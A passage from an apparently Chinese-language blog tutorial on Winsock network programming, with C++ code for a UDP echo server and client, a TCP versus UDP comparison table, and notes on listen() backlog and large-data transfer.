alt="udp_socket"></p><p>📋服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span><span class="comment">//printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;UDP Server\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>), &amp;wsaData) != <span class="number">0</span>)<span class="comment">//2 2 表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)<span class="comment">//2表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 创建socket</span></span><br><span class="line">    SOCKET  sockServ = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);<span class="comment">//udp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (sockServ == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket Error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败】</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 bind 分配地址和端口</span></span><br><span class="line">    SOCKADDR_IN addrServ, addrClient;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrClient, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrClient));</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrClient);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">44444</span>);</span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">bind</span>(sockServ, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;Bind ERROR:%d\n&quot;,WSAGetLastError());</span></span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Bind ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 等待收发数据【阻塞】[直接接到服务端socket]</span></span><br><span class="line">    <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wait Message:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">recvfrom</span>(sockServ, recvBuf, <span class="built_in">sizeof</span>(recvBuf), <span class="number">0</span>, (sockaddr*)&amp;addrClient, &amp;szAddrCnt);</span><br><span class="line">        std::cout &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf_s</span>(sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="string">&quot;Ack: %s\n&quot;</span>, recvBuf);</span><br><span class="line">        <span class="built_in">sendto</span>(sockServ, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (sockaddr*)&amp;addrClient, szAddrCnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//7 关闭总机</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServ);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>UDP服务端一直<code>bind</code>错误：【错误原因】UDP端口被占用【具体调试方法见第九章】</p></blockquote><p>📋 客户端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span><span class="comment">//getCurrentTimeStr</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">UDPClient</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">UDPClient</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">UDPClient</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;UDP Client\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)<span class="comment">//2 2 表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)<span class="comment">//2表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 初始化套接字</span></span><br><span class="line">    SOCKET  sock_cli = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);<span class="comment">//UDP ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (sock_cli == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);<span class="comment">//将当前时间存入ch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin connect %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 准备发送地址和端口</span></span><br><span class="line">    SOCKADDR_IN addrServ;</span><br><span class="line">    <span class="type">int</span> szAddrServ = <span class="built_in">sizeof</span>(addrServ);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">44444</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 直接收发数据</span></span><br><span class="line">    <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> strLen = <span class="built_in">sendto</span>(sock_cli, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (sockaddr*)&amp;addrServ, szAddrServ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After send %d\n&quot;</span>, strLen);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">recvfrom</span>(sock_cli, recvBuf, <span class="built_in">sizeof</span>(recvBuf), <span class="number">0</span>, (sockaddr*)&amp;addrServ, &amp;szAddrServ);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from server: ,ret = %d\n&quot;</span>, ret);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;recvBuf&quot;</span> &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strLen == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;read() error!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after recv %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sock_cli);</span><br><span class="line">    <span class="comment">//6 终止套接字</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error num = %d, error time %s\n&quot;</span>, ::<span class="built_in">GetLastError</span>(), ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="3-4-3-关于TCP和UDP的总结"><a href="#3-4-3-关于TCP和UDP的总结" class="headerlink" title="3.4.3 关于TCP和UDP的总结"></a>3.4.3 关于TCP和UDP的总结</h4><table><thead><tr><th></th><th><strong>UDP</strong></th><th><strong>TCP</strong></th></tr></thead><tbody><tr><td>是否连接</td><td>无连接</td><td>面向连接</td></tr><tr><td>是否可靠</td><td>不可靠传输，不使用流量控制和拥塞控制</td><td>可靠传输，使用流量控制和拥塞控制</td></tr><tr><td>连接对象个数</td><td>支持一对一，一对多，多对一和多对多交互通信</td><td>只能是一对一通信</td></tr><tr><td>传输方式</td><td>面向报文</td><td>面向字节流</td></tr><tr><td>适用场景</td><td>适用于实时应用（IP电话、视频会议、直播等）</td><td>适用于要求可靠传输的应用，例如文件传输</td></tr></tbody></table><br><h2 id="四-网络编程进阶"><a href="#四-网络编程进阶" class="headerlink" title="四 网络编程进阶"></a>四 网络编程进阶</h2><h3 id="4-1-listen的具体含义"><a href="#4-1-listen的具体含义" class="headerlink" title="4.1 listen的具体含义"></a>4.1 listen的具体含义</h3><p>监听<code>listen(sock_serv, 5)</code>表示同时监听的最大客户数为5，即执行到<code>listen</code>，但尚未执行到<code>accept</code>的队列【并非可服务的客户端数量，而是同时可建立连接的客户端数量，也就是说，该数值是考虑到操作系统的承受能力】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上面的服务端代码中添加：在listen之后休眠20s</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"><span class="comment">//队列满了之后，后面的连接请求无法accept</span></span><br></pre></td></tr></table></figure><br><h3 id="4-2-一种更优雅的recv和send：超大数据的传输"><a href="#4-2-一种更优雅的recv和send：超大数据的传输" class="headerlink" title="4.2 一种更优雅的recv和send：超大数据的传输"></a>4.2 一种更优雅的recv和send：超大数据的传输</h3><p>📋基于<code>3.4.1</code>修改后的服务器：</p><ul><li>新增<code>MySocketRecv0</code> 和 <code>MySocketSend0</code> 用于循环接受和发送</li><li>新增 <code>ErrorHandling</code> 统一处理错误提示</li><li>新增 <code>getCurrentTimeStr</code> 打印时间</li><li>简化了初始化网络库的代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span><span class="comment">//printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span><span class="comment">//system</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARRAYSIZE (1024*1024*10)</span></span><br><span class="line"><span class="type">char</span> message[MAX_ARRAYSIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketRecv0</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span>* buf, <span class="type">int</span> dateSize)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketSend0</span><span class="params">(<span class="type">int</span> socketNum, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">unsigned</span> dataSize)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Server\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> 